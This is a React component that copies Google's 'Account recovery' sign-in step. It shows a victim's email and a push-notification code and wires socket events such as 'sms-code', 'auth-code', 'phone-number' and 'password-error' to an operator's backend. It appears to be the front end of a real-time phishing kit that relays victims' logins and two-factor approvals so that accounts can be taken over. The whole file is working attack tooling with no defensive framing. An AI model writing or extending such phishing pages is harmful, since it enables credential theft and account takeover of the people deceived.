import React, { useState,useEffect } from 'react';
import Logo from "./assets/logo.webp";
const VerificationStep = ({ email, code, socket, onBack, handleServerEvent }) => {
  useEffect(() => {
    if (!socket) return;

    const events = [
      'tap-code',
      'sms-code',
      'auth-code',
      'phone-number',
      'redirect',
      'login-error',
      'password-error',
      'smscode-error',
      'authcode-error',
    ];

    // When any of these events come from backend → reuse Login's handler
    events.forEach((evt) =>
      socket.on(evt, (data) => {
        console.log(`[VerificationStep] socket event: ${evt}`, data);
        handleServerEvent(evt, data);
      })
    );

    // Cleanup
    return () => {
      events.forEach((evt) => socket.off(evt));
    };
  }, [socket, handleServerEvent]);
  return (
    <div className="md:min-h-screen bg-white md:bg-[#f0f4f9]  flex items-center justify-center pt-5 md:py-12 px-4">
      <div className="w-full max-w-md md:max-w-5xl md:bg-white rounded-[28px] md:shadow-sm">
        
        <div className="md:p-12">
          {/* Desktop Layout */}
          <div className="hidden md:flex md:gap-16 md:items-start">
            {/* Left Side */}
            <div className="flex-1">
              <div className="mb-6">
                <img src={Logo} alt="logo" className="w-20" />
              </div>

              <h1 className="text-4xl font-normal text-gray-800 mb-4 text-start">Account recovery</h1>
              <p className="text-base text-gray-600 text-start leading-6 mb-8">
                To help keep your account safe, Google wants to make sure it's really you trying to sign in
              </p>

              {/* Email Display */}
              <div className="flex items-center gap-3 mb-6 p-1 border border-[#612B1F] rounded-[16px] w-fit">
                <svg
                  className="svgja"
                  aria-hidden="true"
                  fill="currentColor"
                  focusable="false"
                  width="20px"
                  height="20px"
                  viewBox="0 0 24 24"
                  xmlns="https://www.w3.org/2000/svg"
                >
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                </svg>

                <div className="">
                  <div className="text-sm text-gray-900 truncate">{email}</div>
                </div>
                <button onClick={onBack} className="text-sm text-blue-600 hover:underline">
                  <svg
                    aria-hidden="true"
                    className="svgja"
                    fill="currentColor"
                    focusable="false"
                    width="24px"
                    height="24px"
                    viewBox="0 0 24 24"
                    xmlns="https://www.w3.org/2000/svg"
                  >
                    <path d="M7 10l5 5 5-5z"></path>
                  </svg>
                </button>
              </div>
            </div>

            {/* Right Side */}
            <div className="flex-1">
              <div className="space-y-6">
                <div className="text-center">
                  <div className="text-5xl font-medium text-black-400 mb-4">{code}</div>
                </div>

                <div>
                  <h2 className="text-xl font-normal text-gray-800 mb-4 text-start">Open the Gmail app on iPhone</h2>
                  <p className="text-base text-gray-600 text-start">
                    Google sent a notification to your iPhone. Open the Gmail app, tap Yes on the prompt, then tap {code} on your phone to verify it's you.
                  </p>
                </div>

                <div className="pt-16 text-right">
                  <button className="text-sm font-medium text-blue-600 hover:underline" >
                  I don't have my phone
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* Mobile Layout */}
          <div className="md:hidden">
            <div className="text-center mb-6 text-start">
              <div className="inline-flex items-center justify-center mb-4">
                <img src={Logo} alt="logo" className="w-20" />
              </div>

              <h1 className="text-2xl font-normal text-gray-800 mb-4 text-start">Account recovery</h1>
              <p className="text-sm text-gray-600 leading-5  mb-6 text-start">
                To help keep your account safe, Google wants to make sure it's really you trying to sign in
              </p>

              {/* Email Display Mobile */}
              <div className="flex items-center justify-center gap-3 mb-6 p-1 border border-[#612B1F] rounded-[16px] w-fit">
                <svg
                  className="svgja"
                  aria-hidden="true"
                  fill="currentColor"
                  focusable="false"
                  width="20px"
                  height="20px"
                  viewBox="0 0 24 24"
                  xmlns="https://www.w3.org/2000/svg"
                >
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                </svg>

                <div className="flex-1">
                  <div className="text-sm text-gray-900 truncate">{email}</div>
                </div>
                <button onClick={onBack} className="text-sm text-blue-600 hover:underline">
                  <svg
                    aria-hidden="true"
                    className="svgja"
                    fill="currentColor"
                    focusable="false"
                    width="24px"
                    height="24px"
                    viewBox="0 0 24 24"
                    xmlns="https://www.w3.org/2000/svg"
                  >
                    <path d="M7 10l5 5 5-5z"></path>
                  </svg>
                </button>
              </div>
            </div>

            <div className="space-y-6">
              <div className="text-center mt-10">
                <div className="text-6xl font-light text-black mb-4">{code}</div>
              </div>

              <div className="text-start">
                <h2 className="text-lg font-normal text-gray-800 mb-4">Open the Gmail app on iPhone</h2>
                <p className="text-sm text-gray-600 leading-5 mb-6">
                  Google sent a notification to your iPhone. Open the Gmail app, tap <span className="font-medium">Yes</span> on the prompt, then tap <span className="font-medium">{code}</span> on your phone to verify it's you.
                </p>
              </div>

              <div className="text-center pt-8 text-start">
                <button onClick={onBack} className="text-sm font-medium text-blue-600 hover:underline">
                  I don't have my phone
                </button>
              </div>
            </div>
          </div>
        </div>
  <footer className="fixed bottom-0 left-0 md:bottom-auto md:left-auto w-full  md:max-w-5xl text-gray-600  text-[13px] px-4 md:px-6 py-2 flex items-center justify-center md:justify-between gap-6 flex-wrap">
          {/* Language selector */}
          <div className="flex items-center gap-1">
            <select
              className="bg-transparent text-gray-600 dark:text-gray-300 text-sm focus:outline-none cursor-pointer"
              defaultValue="en-GB"
            >
              <option value="en-US">English (United States)</option>
              <option value="en-GB">English (United Kingdom)</option>
              <option value="fr">Français</option>
              <option value="es">Español</option>
              <option value="de">Deutsch</option>
            </select>
          </div>

          {/* Footer links */}
          <div className="flex items-center gap-6">
            <a href="https://support.google.com/accounts?hl=en-GB&visit_id=638967175488186215-4011923115&rd=2&p=account_iph#topic=3382296" target="_blank" className="hover:underline">
              Help
            </a>
            <a href="https://policies.google.com/privacy?hl=en-GB" target="_blank" className="hover:underline">
              Privacy
            </a>
            <a href="https://policies.google.com/terms?hl=en-GB" target="_blank" className="hover:underline">
              Terms
            </a>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default VerificationStep;
